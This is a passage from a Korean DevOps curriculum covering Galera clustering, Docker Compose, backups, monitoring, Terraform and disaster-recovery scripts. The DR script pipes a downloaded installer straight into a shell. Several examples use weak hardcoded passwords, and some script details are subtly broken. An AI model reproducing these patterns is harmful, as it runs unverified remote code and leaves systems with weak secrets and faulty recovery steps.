LATEST_BACKUP=$(find \${BACKUP_DIR} -type d -name "full-*" | sort -r | head -1)

# 2. 백업 복원
xtrabackup --prepare --target-dir=\${LATEST_BACKUP}
xtrabackup --copy-back --target-dir=\${LATEST_BACKUP}

# 3. Binary Log로 시점 복구
BACKUP_TIME=$(cat \${LATEST_BACKUP}/xtrabackup_binlog_info | awk '{print $3}')
mysqlbinlog --start-datetime="\${BACKUP_TIME}" \\
            --stop-datetime="\${RESTORE_TIME}" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

echo "Restored to \${RESTORE_TIME}"`},{heading:"6. 멀티 데이터센터 배포",code:`# 지리적으로 분산된 Galera Cluster
# DC1: 서울 (2 nodes)
# DC2: 도쿄 (2 nodes)
# DC3: 싱가포르 (1 node + arbitrator)

# galera.cnf (각 노드)
wsrep_provider_options=" \\
  gmcast.segment=0; \\           # 세그먼트 ID (DC별로 다르게)
  evs.suspect_timeout=PT10S; \\  # 네트워크 지연 허용 10초
  evs.inactive_timeout=PT30S; \\
  evs.install_timeout=PT15S"

# 네트워크 레이턴시 고려
# 서울-도쿄: 30ms
# 서울-싱가포르: 70ms
# 도쿄-싱가포르: 80ms

# 쓰기 흐름:
# 1. 서울 노드에 INSERT
# 2. 모든 노드(도쿄, 싱가포르)에 동기 복제
# 3. 과반수(3/5) 노드 ACK → 커밋 완료
# 평균 쓰기 레이턴시: 70~100ms (WAN 환경)

# 읽기 최적화: GeoDNS로 가까운 DC 연결
# 한국 사용자 → 서울 노드
# 일본 사용자 → 도쿄 노드
# 동남아 사용자 → 싱가포르 노드

# ProxySQL에서 지연 기반 라우팅
INSERT INTO mysql_servers(hostgroup_id, hostname, weight) VALUES
  (1, 'seoul-node1', 100),      # 가중치 높음
  (1, 'tokyo-node1', 50),       # 지연 시간 고려
  (1, 'singapore-node1', 10);   # 지연 시간 가장 큼`},{heading:"⚡ 고급 실습 과제",checklist:["Galera Cluster 3노드 구성 후 모든 노드에서 쓰기 테스트","HAProxy로 로드 밸런싱 설정 및 노드 장애 시 자동 제외 확인","XtraBackup으로 증분 백업 후 PITR로 특정 시점 복구","Split-Brain 방지를 위한 Arbitrator 추가 및 쿼럼 테스트","2개 데이터센터에 Galera 노드 배포 후 지리적 분산 확인"]}]}}},{id:"4-4",name:"인프라 자동화 (IaC)",goal:"인프라를 코드로 관리할 수 있다",hours:18,keywords:["Infrastructure as Code","Docker Compose","disaster recovery"],tasks:[],content:{beginner:{title:"초급: Docker Compose로 멀티 컨테이너 환경 구성",sections:[{subtitle:"1. Docker Compose 기본 구조 이해",content:`Docker Compose는 여러 컨테이너를 YAML 파일 하나로 정의하고 관리하는 도구입니다.

**docker-compose.yml 기본 구조**:
\`\`\`yaml
version: '3.8'

services:
  # 웹 애플리케이션
  web:
    image: node:20-alpine
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - DB_HOST=db
    volumes:
      - ./app:/app
      - /app/node_modules
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped

  # MySQL 데이터베이스
  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=\${DB_PASSWORD}
      - MYSQL_DATABASE=myapp
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    restart: unless-stopped

  # Redis 캐시
  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data
    networks:
      - app-network
    restart: unless-stopped

volumes:
  mysql-data:
  redis-data:

networks:
  app-network:
    driver: bridge
\`\`\`

**주요 개념**:
- **services**: 실행할 컨테이너들 정의
- **volumes**: 데이터 영속성 보장
- **networks**: 컨테이너 간 통신 네트워크
- **depends_on**: 시작 순서 제어
- **restart**: 재시작 정책`,checklist:["docker-compose.yml 파일 생성하고 웹/DB/캐시 서비스 정의","환경 변수를 .env 파일로 분리 (DB_PASSWORD 등)","docker-compose up -d로 전체 스택 실행","docker-compose ps로 모든 서비스 상태 확인","docker-compose logs -f web으로 로그 실시간 모니터링"]},{subtitle:"2. 환경별 설정 분리 (dev/staging/prod)",content:`환경별로 다른 설정을 사용하기 위해 Compose Override 기능을 활용합니다.

**베이스 설정 (docker-compose.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    environment:
      - NODE_ENV=production
    # 공통 설정들...
\`\`\`

**개발 환경 오버라이드 (docker-compose.dev.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    build:
      context: .
      dockerfile: Dockerfile.dev
    environment:
      - NODE_ENV=development
      - DEBUG=*
    volumes:
      - .:/app  # 소스 코드 실시간 반영
    ports:
      - "3000:3000"
      - "9229:9229"  # Node.js 디버거 포트
    command: npm run dev

  db:
    ports:
      - "3306:3306"  # 로컬 DB 클라이언트 접근
\`\`\`

**프로덕션 환경 오버라이드 (docker-compose.prod.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  db:
    # 포트 외부 노출 안 함 (보안)
    # ports 섹션 없음
\`\`\`

**환경별 실행**:
\`\`\`bash
# 개발 환경
docker-compose -f docker-compose.yml -f docker-compose.dev.yml up

# 프로덕션 환경
docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d

# .env 파일로 환경 변수 주입
echo "DB_PASSWORD=secret123" > .env
docker-compose --env-file .env up
\`\`\``,checklist:["docker-compose.dev.yml 생성하고 볼륨 마운트로 핫 리로드 설정","docker-compose.prod.yml 생성하고 리소스 제한 설정","각 환경별로 실행해서 설정 차이 확인",".env.example 파일 생성하고 필요한 환경 변수 문서화","docker-compose config로 최종 병합된 설정 확인"]},{subtitle:"3. Health Check와 의존성 관리",content:`컨테이너가 실제로 준비되었는지 확인하는 Health Check를 설정합니다.

**Health Check 설정**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy

  db:
    image: mysql:8.0
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5
\`\`\`

**Wait-for-it 스크립트 사용** (더 정교한 대기):
\`\`\`yaml
services:
  web:
    image: myapp:latest
    command: >
      sh -c "
        ./wait-for-it.sh db:3306 -t 60 &&
        ./wait-for-it.sh redis:6379 -t 60 &&
        npm start
      "
    volumes:
      - ./wait-for-it.sh:/app/wait-for-it.sh
\`\`\`

**wait-for-it.sh**:
\`\`\`bash
#!/bin/bash
# https://github.com/vishnubob/wait-for-it

TIMEOUT=15
QUIET=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--timeout)
      TIMEOUT="$2"
      shift 2
      ;;
    *)
      HOST=$(echo $1 | cut -d: -f1)
      PORT=$(echo $1 | cut -d: -f2)
      shift
      ;;
  esac
done

echo "Waiting for $HOST:$PORT..."

for i in \`seq $TIMEOUT\`; do
  nc -z $HOST $PORT && echo "Service is up!" && exit 0
  sleep 1
done

echo "Timeout waiting for $HOST:$PORT"
exit 1
\`\`\``,checklist:["모든 서비스에 healthcheck 설정 추가","docker-compose up 실행 후 서비스 시작 순서 확인","docker inspect로 health 상태 확인","DB 컨테이너를 일부러 중단시켜 재시작 동작 테스트","wait-for-it.sh 스크립트 다운로드 후 권한 설정 (chmod +x)"]}]},intermediate:{title:"중급: 인프라 백업/복구 자동화와 모니터링 통합",sections:[{subtitle:"1. 전체 인프라 백업/복구 자동화",content:`Docker 볼륨, 설정, 데이터베이스를 모두 백업하는 자동화 시스템을 구축합니다.

**backup-compose.yml** (백업 전용 스택):
\`\`\`yaml
version: '3.8'

services:
  # 정기 백업 서비스
  backup:
    image: alpine:latest
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - mysql-data:/backup/mysql:ro
      - redis-data:/backup/redis:ro
      - ./backups:/backups
      - ./backup.sh:/backup.sh
    environment:
      - AWS_ACCESS_KEY_ID=\${AWS_ACCESS_KEY_ID}
      - AWS_SECRET_ACCESS_KEY=\${AWS_SECRET_ACCESS_KEY}
      - S3_BUCKET=my-infra-backups
    command: >
      sh -c "
        apk add --no-cache docker-cli aws-cli &&
        crond -f
      "
    restart: unless-stopped

volumes:
  mysql-data:
    external: true
  redis-data:
    external: true
\`\`\`

**backup.sh** (전체 백업 스크립트):
\`\`\`bash
#!/bin/bash
set -e

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backups/\${DATE}"
mkdir -p \${BACKUP_DIR}

echo "🔄 Starting full infrastructure backup..."

# 1. Docker Compose 설정 백업
echo "📄 Backing up Docker Compose configs..."
cp /app/docker-compose.yml \${BACKUP_DIR}/
cp /app/.env \${BACKUP_DIR}/

# 2. MySQL 백업 (컨테이너 내부에서 실행)
echo "💾 Backing up MySQL..."
docker exec mysql mysqldump -u root -p\${MYSQL_ROOT_PASSWORD} \\
  --all-databases --single-transaction --quick \\
  | gzip > \${BACKUP_DIR}/mysql_\${DATE}.sql.gz

# 3. Redis 백업 (RDB 파일 복사)
echo "📦 Backing up Redis..."
docker exec redis redis-cli BGSAVE
sleep 5  # RDB 저장 대기
docker cp redis:/data/dump.rdb \${BACKUP_DIR}/redis_\${DATE}.rdb

# 4. Docker 볼륨 직접 백업
echo "📂 Backing up Docker volumes..."
tar czf \${BACKUP_DIR}/volumes_\${DATE}.tar.gz -C /backup mysql redis

# 5. 전체 백업을 하나로 압축
echo "🗜️  Compressing full backup..."
tar czf /backups/full_backup_\${DATE}.tar.gz -C /backups \${DATE}

# 6. S3 업로드
echo "☁️  Uploading to S3..."
aws s3 cp /backups/full_backup_\${DATE}.tar.gz \\
  s3://\${S3_BUCKET}/infra/\${DATE}/ \\
  --storage-class STANDARD_IA

# 7. 로컬 백업 정리 (7일 이상 된 것 삭제)
find /backups -name "full_backup_*.tar.gz" -mtime +7 -delete

echo "✅ Backup completed: \${DATE}"

# Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d "{"text":"✅ Infrastructure backup completed: \${DATE}"}"
\`\`\`

**Cron 설정** (매일 새벽 3시):
\`\`\`bash
# backup 컨테이너 내부의 /etc/crontabs/root
0 3 * * * /backup.sh >> /var/log/backup.log 2>&1
\`\`\`

**복구 스크립트 (restore.sh)**:
\`\`\`bash
#!/bin/bash
set -e

BACKUP_FILE=$1

if [ -z "$BACKUP_FILE" ]; then
  echo "Usage: ./restore.sh <backup_file.tar.gz>"
  exit 1
fi

echo "⚠️  WARNING: This will restore infrastructure from backup!"
read -p "Continue? (yes/no): " confirm

if [ "$confirm" != "yes" ]; then
  exit 0
fi

# 1. 기존 스택 중단
echo "🛑 Stopping current stack..."
docker-compose down

# 2. 백업 압축 해제
echo "📦 Extracting backup..."
tar xzf $BACKUP_FILE -C /tmp/

BACKUP_DIR=$(tar tzf $BACKUP_FILE | head -1 | cut -f1 -d"/")

# 3. 설정 파일 복원
echo "📄 Restoring configs..."
cp /tmp/\${BACKUP_DIR}/docker-compose.yml ./
cp /tmp/\${BACKUP_DIR}/.env ./

# 4. MySQL 복원
echo "💾 Restoring MySQL..."
docker-compose up -d db
sleep 10
gunzip < /tmp/\${BACKUP_DIR}/mysql_*.sql.gz | \\
  docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

# 5. Redis 복원
echo "📦 Restoring Redis..."
docker cp /tmp/\${BACKUP_DIR}/redis_*.rdb redis:/data/dump.rdb
docker-compose restart redis

# 6. 전체 스택 재시작
echo "🚀 Starting full stack..."
docker-compose up -d

echo "✅ Restore completed!"
\`\`\``,checklist:["backup-compose.yml 생성하고 백업 서비스 실행","backup.sh 스크립트 작성 후 수동 실행으로 테스트","S3 버킷 생성 및 AWS 자격 증명 설정","Cron으로 매일 자동 백업 설정","restore.sh로 백업 파일 하나 선택해서 복구 테스트"]},{subtitle:"2. Prometheus + Grafana 모니터링 통합",content:`Docker Compose에 모니터링 스택을 통합하여 인프라 전체를 모니터링합니다.

**monitoring-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Prometheus (메트릭 수집)
  prometheus:
    image: prom/prometheus:latest
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.retention.time=30d'
    ports:
      - "9090:9090"
    networks:
      - monitoring

  # Grafana (시각화)
  grafana:
    image: grafana/grafana:latest
    volumes:
      - grafana-data:/var/lib/grafana
      - ./grafana/provisioning:/etc/grafana/provisioning
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
    ports:
      - "3001:3000"
    networks:
      - monitoring
    depends_on:
      - prometheus

  # Node Exporter (호스트 메트릭)
  node-exporter:
    image: prom/node-exporter:latest
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    command:
      - '--path.procfs=/host/proc'
      - '--path.sysfs=/host/sys'
      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)'
    ports:
      - "9100:9100"
    networks:
      - monitoring

  # cAdvisor (컨테이너 메트릭)
  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
    ports:
      - "8080:8080"
    networks:
      - monitoring

  # MySQL Exporter (DB 메트릭)
  mysql-exporter:
    image: prom/mysqld-exporter:latest
    environment:
      - DATA_SOURCE_NAME=exporter:password@(db:3306)/
    ports:
      - "9104:9104"
    networks:
      - monitoring
      - app-network

  # Redis Exporter (캐시 메트릭)
  redis-exporter:
    image: oliver006/redis_exporter:latest
    environment:
      - REDIS_ADDR=redis:6379
    ports:
      - "9121:9121"
    networks:
      - monitoring
      - app-network

volumes:
  prometheus-data:
  grafana-data:

networks:
  monitoring:
    driver: bridge
  app-network:
    external: true
\`\`\`

**prometheus.yml** (Prometheus 설정):
\`\`\`yaml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  # Prometheus 자체 모니터링
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']

  # 호스트 메트릭
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  # 컨테이너 메트릭
  - job_name: 'cadvisor'
    static_configs:
      - targets: ['cadvisor:8080']

  # MySQL 메트릭
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis 메트릭
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # 애플리케이션 메트릭 (Node.js prom-client)
  - job_name: 'app'
    static_configs:
      - targets: ['web:3000']
    metrics_path: '/metrics'
\`\`\`

**전체 스택 실행**:
\`\`\`bash
# 앱 + 모니터링 동시 실행
docker-compose -f docker-compose.yml -f monitoring-compose.yml up -d

# Grafana 접속: http://localhost:3001
# 기본 로그인: admin / admin

# Prometheus 쿼리 예시
# - 컨테이너 CPU: container_cpu_usage_seconds_total
# - MySQL 쿼리 수: mysql_global_status_queries
# - Redis 메모리: redis_memory_used_bytes
\`\`\``,checklist:["monitoring-compose.yml 생성하고 모니터링 스택 실행","Prometheus UI(9090)에서 모든 타겟이 UP 상태인지 확인","Grafana(3001)에서 Prometheus 데이터소스 추가","Grafana에서 Docker Dashboard 임포트 (ID: 179, 193)","앱에 부하를 주고 CPU/메모리 메트릭 실시간 확인"]},{subtitle:"3. 로그 중앙화 (Loki + Promtail)",content:`모든 컨테이너 로그를 Loki에 수집하고 Grafana에서 통합 조회합니다.

**logging-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Loki (로그 저장소)
  loki:
    image: grafana/loki:latest
    ports:
      - "3100:3100"
    volumes:
      - ./loki-config.yml:/etc/loki/local-config.yaml
      - loki-data:/loki
    command: -config.file=/etc/loki/local-config.yaml
    networks:
      - monitoring

  # Promtail (로그 수집 에이전트)
  promtail:
    image: grafana/promtail:latest
    volumes:
      - /var/log:/var/log:ro
      - /var/lib/docker/containers:/var/lib/docker/containers:ro
      - ./promtail-config.yml:/etc/promtail/config.yml
    command: -config.file=/etc/promtail/config.yml
    networks:
      - monitoring

volumes:
  loki-data:

networks:
  monitoring:
    external: true
\`\`\`

**loki-config.yml**:
\`\`\`yaml
auth_enabled: false

server:
  http_listen_port: 3100

ingester:
  lifecycler:
    ring:
      kvstore:
        store: inmemory
      replication_factor: 1

schema_config:
  configs:
    - from: 2024-01-01
      store: boltdb-shipper
      object_store: filesystem
      schema: v11
      index:
        prefix: index_
        period: 24h

storage_config:
  boltdb_shipper:
    active_index_directory: /loki/index
    cache_location: /loki/cache
  filesystem:
    directory: /loki/chunks

limits_config:
  retention_period: 168h  # 7일 보관
\`\`\`

**promtail-config.yml**:
\`\`\`yaml
server:
  http_listen_port: 9080

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  # Docker 컨테이너 로그 수집
  - job_name: docker
    static_configs:
      - targets:
          - localhost
        labels:
          job: docker
          __path__: /var/lib/docker/containers/*/*.log
    pipeline_stages:
      - json:
          expressions:
            output: log
            stream: stream
            container_name: attrs.name
      - labels:
          container_name:
          stream:
      - output:
          source: output
\`\`\`

**Grafana에서 Loki 연동**:
\`\`\`bash
# Grafana Data Source 추가
# URL: http://loki:3100

# LogQL 쿼리 예시
{container_name="web"} |= "ERROR"
{container_name="db"} |= "slow query"
{job="docker"} | json | line_format "{{.container_name}}: {{.log}}"
\`\`\``,checklist:["logging-compose.yml 생성하고 Loki + Promtail 실행","Grafana에서 Loki 데이터소스 추가 (http://loki:3100)",'Explore 탭에서 {container_name="web"} 쿼리로 로그 확인','에러 로그만 필터링하는 쿼리 작성 (|= "ERROR")',"로그 + 메트릭 통합 대시보드 생성 (CPU 높을 때 로그 연동)"]}]},advanced:{title:"고급: Terraform으로 인프라 코드화 및 재해 복구",sections:[{subtitle:"1. Terraform으로 CapRover 인프라 관리",content:`Terraform을 사용해 CapRover 서버와 Docker 리소스를 코드로 관리합니다.

**프로젝트 구조**:
\`\`\`
terraform/
├── main.tf              # 메인 설정
├── variables.tf         # 변수 정의
├── outputs.tf          # 출력값
├── provider.tf         # 프로바이더 설정
├── modules/
│   ├── caprover/       # CapRover 모듈
│   ├── docker/         # Docker 리소스 모듈
│   └── monitoring/     # 모니터링 스택 모듈
└── environments/
    ├── dev.tfvars
    ├── staging.tfvars
    └── prod.tfvars
\`\`\`

**provider.tf** (Docker Provider 사용):
\`\`\`hcl
terraform {
  required_providers {
    docker = {
      source  = "kreuzwerker/docker"
      version = "~> 3.0"
    }
  }

  # 상태 저장소 (S3 백엔드)
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "caprover/terraform.tfstate"
    region = "ap-northeast-2"
  }
}

provider "docker" {
  host = "unix:///var/run/docker.sock"
}
\`\`\`

**main.tf** (Docker 네트워크 및 볼륨):
\`\`\`hcl
# Docker 네트워크
resource "docker_network" "app_network" {
  name   = "app-network"
  driver = "bridge"
}

# MySQL 볼륨
resource "docker_volume" "mysql_data" {
  name = "mysql-data"
}

# Redis 볼륨
resource "docker_volume" "redis_data" {
  name = "redis-data"
}

# MySQL 컨테이너
resource "docker_container" "mysql" {
  name  = "mysql"
  image = docker_image.mysql.image_id

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_root_password}",
    "MYSQL_DATABASE=\${var.mysql_database}"
  ]

  volumes {
    volume_name    = docker_volume.mysql_data.name
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"

  healthcheck {
    test     = ["CMD", "mysqladmin", "ping", "-h", "localhost"]
    interval = "10s"
    timeout  = "5s"
    retries  = 5
  }
}

# Redis 컨테이너
resource "docker_container" "redis" {
  name  = "redis"
  image = docker_image.redis.image_id

  volumes {
    volume_name    = docker_volume.redis_data.name
    container_path = "/data"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"
}

# 웹 애플리케이션 컨테이너
resource "docker_container" "web" {
  name  = "web"
  image = docker_image.app.image_id

  env = [
    "NODE_ENV=\${var.environment}",
    "DB_HOST=mysql",
    "REDIS_HOST=redis"
  ]

  ports {
    internal = 3000
    external = var.app_port
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  depends_on = [
    docker_container.mysql,
    docker_container.redis
  ]

  restart = "unless-stopped"
}

# Docker 이미지
resource "docker_image" "mysql" {
  name = "mysql:8.0"
}

resource "docker_image" "redis" {
  name = "redis:7-alpine"
}

resource "docker_image" "app" {
  name = "\${var.app_image}:\${var.app_version}"
}
\`\`\`

**variables.tf**:
\`\`\`hcl
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "mysql_root_password" {
  description = "MySQL root password"
  type        = string
  sensitive   = true
}

variable "mysql_database" {
  description = "MySQL database name"
  type        = string
  default     = "myapp"
}

variable "app_image" {
  description = "Application Docker image"
  type        = string
}

variable "app_version" {
  description = "Application version tag"
  type        = string
  default     = "latest"
}

variable "app_port" {
  description = "Application external port"
  type        = number
  default     = 3000
}
\`\`\`

**environments/prod.tfvars**:
\`\`\`hcl
environment   = "production"
app_image     = "myregistry/myapp"
app_version   = "v1.2.3"
app_port      = 80
mysql_database = "myapp_prod"
\`\`\`

**Terraform 실행**:
\`\`\`bash
# 초기화
terraform init

# 계획 확인
terraform plan -var-file=environments/prod.tfvars

# 적용
terraform apply -var-file=environments/prod.tfvars

# 특정 리소스만 재생성
terraform taint docker_container.web
terraform apply

# 전체 인프라 제거
terraform destroy -var-file=environments/prod.tfvars
\`\`\``,checklist:["Terraform 설치 및 provider.tf 작성","main.tf에 Docker 네트워크/볼륨/컨테이너 정의","terraform plan으로 변경 사항 미리보기","terraform apply로 인프라 프로비저닝","웹 컨테이너 설정 변경 후 terraform apply로 무중단 업데이트"]},{subtitle:"2. 재해 복구 계획 (Disaster Recovery)",content:`전체 인프라를 다른 리전/서버에 빠르게 복구하는 자동화 시스템을 구축합니다.

**DR(재해 복구) 전략 - RTO/RPO 정의**:
- **RTO (Recovery Time Objective)**: 목표 복구 시간 - 30분
- **RPO (Recovery Point Objective)**: 목표 복구 시점 - 15분

**dr-plan.sh** (재해 복구 자동화):
\`\`\`bash
#!/bin/bash
set -e

DR_REGION="us-west-2"  # Primary: ap-northeast-2
DR_SERVER="dr-server.example.com"
BACKUP_BUCKET="s3://my-dr-backups"

echo "🚨 Starting Disaster Recovery Process..."

# 1. 최신 백업 확인
echo "📦 Finding latest backup..."
LATEST_BACKUP=$(aws s3 ls \${BACKUP_BUCKET}/infra/ | sort | tail -n 1 | awk '{print $4}')

if [ -z "$LATEST_BACKUP" ]; then
  echo "❌ No backup found!"
  exit 1
fi

echo "✅ Latest backup: $LATEST_BACKUP"

# 2. DR 서버에 SSH 접속하여 복구 시작
echo "🔗 Connecting to DR server..."
ssh ubuntu@\${DR_SERVER} << 'EOF'
  # Docker 설치 확인
  if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    curl -fsSL https://get.docker.com | sh
    sudo usermod -aG docker ubuntu
  fi

  # Terraform 설치 확인
  if ! command -v terraform &> /dev/null; then
    echo "Installing Terraform..."
    wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
    unzip terraform_1.6.0_linux_amd64.zip
    sudo mv terraform /usr/local/bin/
  fi

  # 백업 다운로드
  aws s3 cp \${BACKUP_BUCKET}/infra/\${LATEST_BACKUP} ./backup.tar.gz

  # 백업 압축 해제
  tar xzf backup.tar.gz

  # Terraform 상태 복구
  cd terraform
  terraform init -backend-config="bucket=my-dr-terraform-state"
  terraform apply -auto-approve -var-file=environments/dr.tfvars

  # Docker Compose로 서비스 시작
  docker-compose -f docker-compose.yml up -d

  # 데이터베이스 복구
  gunzip < backup/mysql_*.sql.gz | docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

  # Health Check
  echo "🏥 Running health checks..."
  sleep 30
  curl -f http://localhost/health || exit 1

  echo "✅ DR recovery completed!"
EOF

# 3. DNS 업데이트 (Route53)
echo "🌐 Updating DNS to DR server..."
aws route53 change-resource-record-sets \\
  --hosted-zone-id Z1234567890ABC \\
  --change-batch '{
    "Changes": [{
      "Action": "UPSERT",
      "ResourceRecordSet": {
        "Name": "app.example.com",
        "Type": "A",
        "TTL": 60,
        "ResourceRecords": [{"Value": "'$(dig +short \${DR_SERVER})'"}]
      }
    }]
  }'

# 4. Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d '{
    "text": "🚨 Disaster Recovery activated! Services running on DR server.",
    "attachments": [{
      "color": "warning",
      "fields": [
        {"title": "Backup Used", "value": "'\${LATEST_BACKUP}'", "short": true},
        {"title": "DR Server", "value": "'\${DR_SERVER}'", "short": true}
      ]
    }]
  }'

echo "✅ Disaster Recovery completed successfully!"
echo "🌐 Services now running on: \${DR_SERVER}"
\`\`\`

**DR 테스트 자동화** (매월 실행):
\`\`\`bash
#!/bin/bash
# dr-test.sh - 재해 복구 훈련

echo "🧪 Starting DR Test (non-destructive)..."

# 1. 테스트용 DR 서버 프로비저닝 (Terraform)
cd terraform
terraform workspace new dr-test
terraform apply -auto-approve -var-file=environments/dr-test.tfvars

# 2. 최신 백업으로 복구 테스트
./dr-plan.sh --test-mode

# 3. 성능 테스트 (k6)
k6 run --vus 100 --duration 5m load-test.js

# 4. 결과 리포트 생성
cat > dr-test-report.md << EOF
# DR Test Report - $(date +%Y-%m-%d)

## Summary
- **RTO Achieved**: \${RTO_MINUTES} minutes
- **RPO Achieved**: \${RPO_MINUTES} minutes
- **Performance**: \${PERFORMANCE_SCORE}/100

## Services Status
- Web: ✅ Healthy
- Database: ✅ Healthy
- Cache: ✅ Healthy

## Recommendations
- Update DNS TTL to 60 seconds for faster failover
- Increase backup frequency to every 10 minutes
EOF

# 5. 테스트 환경 정리
terraform workspace select default
terraform destroy -auto-approve

echo "✅ DR Test completed. Report: dr-test-report.md"
\`\`\`

**자동 페일오버 (Health Check 기반)**:
\`\`\`bash
#!/bin/bash
# auto-failover.sh - Cron으로 매분 실행

PRIMARY_URL="https://app.example.com/health"
DR_TRIGGER_THRESHOLD=3  # 3번 연속 실패 시 DR 발동

FAIL_COUNT=$(cat /tmp/fail_count 2>/dev/null || echo 0)

if ! curl -sf \${PRIMARY_URL} > /dev/null; then
  FAIL_COUNT=$((FAIL_COUNT + 1))
  echo \${FAIL_COUNT} > /tmp/fail_count

  if [ \${FAIL_COUNT} -ge \${DR_TRIGGER_THRESHOLD} ]; then
    echo "🚨 PRIMARY DOWN! Triggering DR..."
    ./dr-plan.sh
    echo 0 > /tmp/fail_count
  fi
else
  echo 0 > /tmp/fail_count
fi
\`\`\``,checklist:["dr-plan.sh 스크립트 작성하고 DR 서버 정보 설정","AWS Route53에 도메인 등록 및 DNS 업데이트 테스트","dr-test.sh로 월간 DR 훈련 실행 (RTO/RPO 측정)","auto-failover.sh를 Cron에 등록 (* * * * *)","Primary 서버를 일부러 중단시켜 자동 페일오버 동작 확인"]},{subtitle:"3. Multi-Region 인프라 자동 복제",content:`Terraform을 사용해 여러 리전에 동일한 인프라를 자동으로 배포합니다.

**multi-region 구조**:
\`\`\`
terraform/
├── global/
│   ├── route53.tf        # 글로벌 DNS
│   └── s3-backend.tf     # Terraform 상태 저장소
├── regions/
│   ├── ap-northeast-2/   # 서울 (Primary)
│   ├── us-west-2/        # 오리건 (DR)
│   └── ap-southeast-1/   # 싱가포르 (CDN Edge)
└── modules/
    └── app-stack/        # 재사용 가능한 앱 스택
\`\`\`

**modules/app-stack/main.tf** (재사용 모듈):
\`\`\`hcl
variable "region" {
  type = string
}

variable "environment" {
  type = string
}

# Docker 네트워크
resource "docker_network" "app" {
  name = "\${var.environment}-app-network"
}

# MySQL
resource "docker_container" "mysql" {
  name  = "\${var.environment}-mysql"
  image = "mysql:8.0"

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_password}",
    "MYSQL_DATABASE=\${var.db_name}"
  ]

  # 리전별 볼륨
  volumes {
    volume_name    = "\${var.environment}-mysql-data"
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app.name
  }
}

# 웹 앱
resource "docker_container" "web" {
  name  = "\${var.environment}-web"
  image = "myapp:\${var.app_version}"

  ports {
    internal = 3000
    external = 80
  }

  networks_advanced {
    name = docker_network.app.name
  }

  depends_on = [docker_container.mysql]
}

output "web_url" {
  value = "http://\${var.region}.example.com"
}
\`\`\`

**regions/ap-northeast-2/main.tf** (서울 리전):
\`\`\`hcl
module "seoul_stack" {
  source = "../../modules/app-stack"

  region      = "ap-northeast-2"
  environment = "seoul-prod"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_seoul"
}

output "seoul_url" {
  value = module.seoul_stack.web_url
}
\`\`\`

**regions/us-west-2/main.tf** (오리건 DR):
\`\`\`hcl
module "oregon_stack" {
  source = "../../modules/app-stack"

  region      = "us-west-2"
  environment = "oregon-dr"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_oregon"
}

output "oregon_url" {
  value = module.oregon_stack.web_url
}
\`\`\`

**global/route53.tf** (지리적 라우팅):
